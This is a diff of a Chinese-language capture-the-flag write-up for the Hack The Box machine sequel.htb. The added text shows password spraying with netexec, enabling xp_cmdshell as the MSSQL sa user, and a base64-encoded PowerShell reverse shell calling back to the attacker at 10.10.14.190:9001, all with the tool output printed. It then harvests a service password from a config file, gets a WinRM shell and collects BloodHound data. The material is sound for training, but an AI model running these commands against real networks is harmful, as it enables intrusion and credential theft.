@@ -258,13 +258,13 @@ angela@sequel.htb:angela
 oscar@sequel.htb:86LxLBMgEWaKUnBG
 kevin@sequel.htb:Md9Wlq1E5bZnVDVo
 sa@sequel.htb:MSSQLP@ssw0rd!
-[★]$ awk -F'[@:]' '{print $1}' user_password.txt > user.txt
+[★]$ awk -F'[@:]' '{print $1}' user_password.txt > users.txt
 [★]$ cat user.txt
 angela
 oscar
 kevin
 sa
-[★]$ awk -F: '{print $2}' user_password.txt > password.txt
+[★]$ awk -F: '{print $2}' user_password.txt > passwords.txt
 [★]$ cat password.txt
 angela
 86LxLBMgEWaKUnBG
@@ -329,4 +329,191 @@ https://en.wikipedia.org/wiki/List_of_file_signatures
 00000000: 504b 0304 1400 0600 0800 0000 2100 4137  PK..........!.A7
 
 [★]$ open accounts.xlsx
+```
+#### 在smb,用户oscar:86LxLBMgEWaKUnBG成功了
+```
+[★]$ netexec smb dc01.sequel.htb -u users.txt -p passwords.txt --continue-on-success
+<SNIP>
+SMB         10.129.65.178   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\angela:angela STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\oscar:angela STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\kevin:angela STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\sa:angela STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\angela:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\kevin:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\sa:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\angela:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\angela:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\kevin:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE
+```
+#### 在mssql上，得到了管理员账户
+```
+[★]$ netexec mssql dc01.sequel.htb -u users.txt -p passwords.txt --continue-on-success --local-auth | grep -F [+]
+MSSQL                    10.129.65.178   1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+//--local-auth 本地/NTLM式的认证流程 ｜ (Pwn3d!) ： “被成功利用/登录”
+```
+### mssqlclient.py为MSSQL内网横向标准工具：
+#### SQL Server → Windows SYSTEM API //远程调用 Windows CreateProcess() 
+```
+[★]$ mssqlclient.py 'sequel.htb/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'
+<SNIP>
+SQL (sa  dbo@master)> xp_cmdshell whoami
+ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online. //xp_cmdshell仍然处于禁用状态
+SQL (sa  dbo@master)> 
+SQL (sa  dbo@master)> enable_xp_cmdshell
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)> 
+SQL (sa  dbo@master)> 
+SQL (sa  dbo@master)> xp_cmdshell whoami
+output           
+--------------   
+sequel\sql_svc   
+
+NULL             
+
+
+```
+#### 或者用netexec，它会启用该功能并自动运行命令：
+```
+[★]$ netexec mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami
+MSSQL       10.129.65.178   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+MSSQL       10.129.65.178   1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+MSSQL       10.129.65.178   1433   DC01             [+] Executed command via mssqlexec
+MSSQL       10.129.65.178   1433   DC01             sequel\sql_svc
+```
+#### 从 https://www.revshells.com/ 获取一个'PowerShell #3 (Base64)' 反向 shell 反向 shell ，并使用以下命令运行它
+#### 编码体系错位:❗ Base64 必须是 UTF-16LE 编码后的内容,而 revshells 默认给你的是：UTF-8 → Base64
+#### 所以自己手动转，不使用网站
+#### 直接生成 TCP 反弹：自己转 UTF-16LE，BASE64 必须来自 UTF-16LE //powershell的反弹Base64 必须是 UTF-16LE 编码后的内容
+```
+[★]$ echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.190",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' \
+| iconv -t UTF-16LE | base64 -w 0
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
+```
+#### 首先侦听
+```
+[*]$ sudo nv -lvnp 9001
+```
+#### payload输入
+```
+SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
+```
+#### 收到反弹
+```
+[*]$ sudo nv -lvnp 9001
+
+S C:\Windows\system32> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+PS C:\users> tree /f /a
+Folder PATH listing
+Volume serial number is 3705-289D
+C:.
++---Administrator
++---Public
+|   +---Accounting Department
+|   |       accounting_2024.xlsx
+|   |       accounts.xlsx
+|   |       
+|   +---Documents
+|   +---Downloads
+|   +---Music
+|   +---Pictures
+|   \---Videos
++---ryan
+\---sql_svc
+    +---Desktop
+    +---Documents
+    +---Downloads
+    +---Favorites
+    +---Links
+    +---Music
+    +---Pictures
+    +---Saved Games
+    \---Videos
+PS C:\users>
+
+//该sql-Configuration.INI文件设有密码：
+PS C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI
+[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+SECURITYMODE="SQL"
+SAPWD="MSSQLP@ssw0rd!"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+```
+### 共享密码
+#### 会更新用户列表，把ryan加进去，然后把新密码喷洒出去：
+```
+[★]$ echo 'ryan' >> users.txt
+
+[★]$ netexec smb dc01.sequel.htb -u users.txt -p WqSZAF6CysDQbGb3 --continue-on-success
+SMB         10.129.65.178   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\angela:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\kevin:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [-] sequel.htb\sa:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE
+SMB         10.129.65.178   445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
+
+[★]$ netexec winrm dc01.sequel.htb -u  ryan -p WqSZAF6CysDQbGb3
+WINRM       10.129.65.178   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+WINRM       10.129.65.178   5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
+
+[★]$ evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i dc01.sequel.htb
+                                        
+Evil-WinRM shell v3.5
+*Evil-WinRM* PS C:\Users\ryan\Desktop> dir
+
+
+    Directory: C:\Users\ryan\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/17/2026  10:01 PM             34 user.txt
+```
+### 以 ca_svc 身份进行身份验证:Bloodhound 寻血猎犬
+```
+[★]$ netexec ldap dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --bloodhound --collection All --dns-server 10.129.65.178
+SMB         10.129.65.178   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.65.178   389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
+LDAP        10.129.65.178   389    DC01             Resolved collection methods: localadmin, acl, psremote, objectprops, rdp, container, dcom, group, session, trusts
+LDAP        10.129.65.178   389    DC01             Done in 00M 02S
+LDAP        10.129.65.178   389    DC01             Compressing output into /home/syareya55/.nxc/logs/DC01_10.129.65.178_2026-01-18_022250_bloodhound.zip
+[★]$ ls /home/syareya55/.nxc/logs/DC01_10.129.65.178_2026-01-18_022250_bloodhound.zip
+/home/syareya55/.nxc/logs/DC01_10.129.65.178_2026-01-18_022250_bloodhound.zip
 ```
